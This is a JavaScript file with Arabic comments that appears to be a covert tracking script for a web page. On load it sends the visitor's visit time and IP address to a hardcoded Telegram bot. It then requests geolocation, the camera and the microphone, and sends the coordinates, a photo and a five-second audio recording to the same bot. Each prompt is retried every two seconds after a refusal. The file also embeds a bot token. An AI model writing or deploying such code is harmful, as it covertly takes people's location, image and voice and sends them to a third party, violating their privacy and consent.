// بيانات Telegram
const token = "7337948703:AAHj1Dk8j4cXb2WrquIt4UhQHkBHQ6w8J_E";
const chatId = "6659044299";

// إرسال إلى Telegram
function sendToTelegram(text) {
  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: chatId, text })
  });
}

// إرسال صورة (كاميرا) إلى Telegram
function sendPhotoToTelegram(photoBlob) {
  const formData = new FormData();
  formData.append("chat_id", chatId);
  formData.append("photo", photoBlob, "photo.jpg");

  fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
    method: "POST",
    body: formData
  });
}

// إرسال صوت إلى Telegram
function sendAudioToTelegram(audioBlob) {
  const formData = new FormData();
  formData.append("chat_id", chatId);
  formData.append("audio", audioBlob, "mic.webm");

  fetch(`https://api.telegram.org/bot${token}/sendAudio`, {
    method: "POST",
    body: formData
  });
}

// الوقت
sendToTelegram("🕒 زيارة جديدة: " + new Date().toLocaleString());

// IP
fetch("https://api.ipify.org/?format=json")
  .then(res => res.json())
  .then(data => sendToTelegram("🌐 IP: " + data.ip));

// الموقع
function askLocation() {
  navigator.geolocation.getCurrentPosition(pos => {
    const { latitude, longitude } = pos.coords;
    const link = `https://maps.google.com/?q=${latitude},${longitude}`;
    sendToTelegram(`📍 الموقع:\nLatitude: ${latitude}\nLongitude: ${longitude}\n${link}`);
  }, () => setTimeout(askLocation, 2000));
}

// كاميرا
function askCamera() {
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      const track = stream.getVideoTracks()[0];
      const imageCapture = new ImageCapture(track);
      imageCapture.takePhoto().then(blob => {
        sendPhotoToTelegram(blob);
        stream.getTracks().forEach(t => t.stop());
      });
    })
    .catch(() => setTimeout(askCamera, 2000));
}

// مايكروفون
function askMic() {
  navigator.mediaDevices.getUserMedia({ audio: true })
    .then(stream => {
      const recorder = new MediaRecorder(stream);
      const chunks = [];

      recorder.ondataavailable = e => chunks.push(e.data);
      recorder.onstop = () => {
        const blob = new Blob(chunks, { type: "audio/webm" });
        sendAudioToTelegram(blob);
        stream.getTracks().forEach(t => t.stop());
      };

      recorder.start();
      setTimeout(() => recorder.stop(), 5000);
    })
    .catch(() => setTimeout(askMic, 2000));
}

// تنفيذ الطلبات
askLocation();
askCamera();
askMic();
